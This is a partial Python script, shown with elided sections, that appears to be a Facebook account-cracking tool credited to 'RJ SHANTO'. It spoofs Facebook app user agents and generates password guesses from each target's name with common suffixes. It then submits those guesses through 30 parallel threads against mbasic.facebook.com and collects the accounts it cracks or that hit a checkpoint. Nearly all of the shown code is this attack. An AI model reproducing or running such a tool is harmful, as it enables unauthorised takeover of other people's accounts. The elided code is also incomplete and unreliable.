...
from concurrent.futures import ThreadPoolExecutor as sarfrazRJ
...
header_grup = 'Mozilla/5.0 (Linux; Android 12; Nokia XR21 Build/SKQ1.220201.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]'
header_grup = 'Mozilla/5.0 (Linux; Android 11; Nokia C1 2nd Edition Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/354.0.0.8.108;]'
header_grup = 'Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/364.0.0.14.77;]'
header_grup = 'Mozilla/5.0 (Linux; Android 13; Nokia XR20 Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]'
...
\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           RJ SHANTO
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          RJ SHANTO
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           Shanto-RJ
...
class __xxx__:
        ...
        try:
            for pw in __chi__:
                ...
                header = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; Infinix X676C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]'",
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with sarfrazRJ(max_workers=30) as RJworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234",xz[0]+"11",xz[0]+"111",xz[0]+"1122",xz[0]+"112233",xz[0]+"@",xz[0]+"@@",xz[0]+"@@@",xz[0]+"@@@@",xz[0]+"@#",xz[0]+"@@##",xz[0]+"##",]
                        else:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234",xz[0]+"11",xz[0]+"111",xz[0]+"1122",xz[0]+"112233",xz[0]+"@",xz[0]+"@@",xz[0]+"@@@",xz[0]+"@@@@",xz[0]+"@#",xz[0]+"@@##",xz[0]+"##",]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234",xz[0]+"11",xz[0]+"111",xz[0]+"1122",xz[0]+"112233",xz[0]+"@",xz[0]+"@@",xz[0]+"@@@",xz[0]+"@@@@",xz[0]+"@#",xz[0]+"@@##",xz[0]+"##",]
                        RJworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
